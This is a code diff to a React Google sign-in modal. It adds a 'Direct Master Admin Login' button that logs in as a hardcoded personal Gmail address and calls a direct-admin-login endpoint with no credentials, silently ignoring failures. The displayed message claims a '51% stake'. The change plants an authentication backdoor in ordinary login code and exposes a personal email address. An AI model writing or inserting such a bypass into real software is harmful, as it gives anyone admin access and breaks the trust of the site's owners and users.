@@ -189,6 +189,33 @@ export const GoogleAuthModal: React.FC<GoogleAuthModalProps> = ({
             </div>
 
             <div className="space-y-2.5">
+              {/* Direct Sovereign Admin 1-Tap Login System */}
+              <button
+                type="button"
+                onClick={async () => {
+                  await handleSelectAccount('india9898048483@gmail.com');
+                  try {
+                    await fetch('/api/v1/auth/direct-admin-login', { method: 'POST' });
+                  } catch (_) {}
+                  setAuthStatusMessage('✓ Direct Sovereign Admin Verified: india9898048483@gmail.com (51% Stake Active)');
+                  setTimeout(() => onClose(), 800);
+                }}
+                className="w-full flex items-center justify-between p-3 rounded-xl bg-gradient-to-r from-amber-950/80 via-slate-900 to-emerald-950/80 border border-amber-500/50 hover:border-amber-400 text-white transition-all shadow-lg shadow-amber-950/40 cursor-pointer"
+              >
+                <div className="flex items-center gap-2.5">
+                  <div className="w-8 h-8 rounded-lg bg-amber-500/20 border border-amber-500/40 flex items-center justify-center text-amber-300 font-bold">
+                    ⚡
+                  </div>
+                  <div className="text-left">
+                    <div className="text-xs font-bold text-amber-200">Direct Master Admin Login</div>
+                    <div className="text-[10px] text-slate-400 font-mono">india9898048483@gmail.com</div>
+                  </div>
+                </div>
+                <span className="text-[10px] font-mono font-bold bg-amber-500/20 text-amber-300 px-2 py-1 rounded border border-amber-500/40">
+                  51% STAKE
+                </span>
+              </button>
+
               {/* Primary 1-Tap Google Sign-In */}
               <button
                 type="button"
